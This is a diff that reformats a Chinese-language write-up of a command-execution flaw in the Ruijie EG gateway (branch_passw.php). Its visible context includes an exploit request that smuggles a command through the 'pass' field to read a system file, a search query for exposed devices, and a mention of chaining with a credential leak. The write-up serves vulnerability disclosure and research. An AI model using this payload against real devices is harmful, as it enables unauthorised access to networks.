@@ -1,8 +1,8 @@
-# 锐捷 EG易网关 branch_passw.php 远程命令执行
+# 锐捷 EG易网关 branch\_passw.php 远程命令执行
 
 ## 漏洞描述
 
-锐捷EG易网关 branch_passw.php存在命令执行漏洞，配合 锐捷EG易网关 管理员账号密码泄露漏洞 达到RCE控制服务器
+锐捷EG易网关 branch\_passw.php存在命令执行漏洞，配合 锐捷EG易网关 管理员账号密码泄露漏洞 达到RCE控制服务器
 
 ## 漏洞影响
 
@@ -20,7 +20,7 @@ app="Ruijie-EG易网关"
 
 首先登录到后台中(可以组合 锐捷EG易网关 管理员账号密码泄露漏洞)
 
-漏洞文件 branch_passw.php
+漏洞文件 branch\_passw.php
 
 ```php
 <?php
@@ -122,11 +122,11 @@ include_once dirname(dirname(__FILE__)) . '/init.php';     //mvc架构初始化
     }
 ```
 
-&pass**变量可控并且无过滤执行命令使用 **|** 即可绕过
+\&pass\*\*变量可控并且无过滤执行命令使用 **|** 即可绕过
 
 发送请求包
 
-```plain
+```
 POST /itbox_pi/branch_passw.php?a=set HTTP/1.1
 Host: 
 User-Agent: Go-http-client/1.1
@@ -141,11 +141,11 @@ pass=|cat /etc/psswd>../test_test.txt
 
 再访问
 
-```plain
+```
 http://xxx.xxx.xxx.xxx/test_test.txt
 ```
 
-![](images/202202110930068.png)
+![](../.gitbook/assets/202202110930068.png)
 
 ## 漏洞POC
 
@@ -249,4 +249,4 @@ if __name__ == '__main__':
     POC_1(target_url)
 ```
 
-![](images/202202110930028.png)
+![](../.gitbook/assets/202202110930028.png)
